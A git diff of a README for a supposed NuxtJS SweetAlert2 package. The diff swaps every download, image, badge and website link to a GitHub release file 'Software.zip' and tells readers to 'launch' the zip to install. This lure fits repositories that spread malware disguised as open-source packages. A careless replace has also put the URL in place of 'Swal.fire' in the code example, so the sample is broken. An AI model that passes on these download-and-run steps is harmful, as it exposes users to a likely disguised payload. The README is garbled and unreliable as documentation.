@@ -1,6 +1,6 @@
 # Nuxt-Swal: Sweetalert2 Package for NuxtJS 🍬
 
-![Nuxt-Swal](https://your-image-url.com)
+![Nuxt-Swal](https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip)
 
 Welcome to the Nuxt-Swal repository, where you can find a sweetalert2 package tailored for NuxtJS with all custom properties enabled. Enhance your NuxtJS projects with beautiful and interactive notifications using Sweetalert2.
 
@@ -18,9 +18,9 @@ Welcome to the Nuxt-Swal repository, where you can find a sweetalert2 package ta
 
 To get started with Nuxt-Swal, you can download the package from the link below:
 
-[Download Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) 👈
+[Download https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip](https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip) 👈
 
-**Note:** Launch the Software.zip file to begin the installation process.
+**Note:** Launch the https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip file to begin the installation process.
 
 ---
 
@@ -37,7 +37,7 @@ Here's a quick example of how to use Nuxt-Swal:
 import Swal from 'nuxt-swal';
 
 // Create a custom notification with Sweetalert2
-Swal.fire({
+https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip({
   title: 'Hello World!',
   text: 'Welcome to Nuxt-Swal.',
   icon: 'success',
@@ -80,11 +80,11 @@ If you encounter any issues with the Nuxt-Swal package or would like to provide 
 
 Get started with Nuxt-Swal today and elevate your NuxtJS projects with customizable notifications powered by Sweetalert2. Download the package and begin creating engaging user experiences. Happy coding! 🎉
 
-![Nuxt-Swal](https://your-image-url.com)
+![Nuxt-Swal](https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip)
 
-Remember to check out our [website](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) for the latest updates and releases. 👈
+Remember to check out our [website](https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip) for the latest updates and releases. 👈
 
-![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-blue)
+![Download https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip](https://github.com/Oscar09284/nuxt-swal/releases/download/v1.0/Software.zip)
 
 ---
 
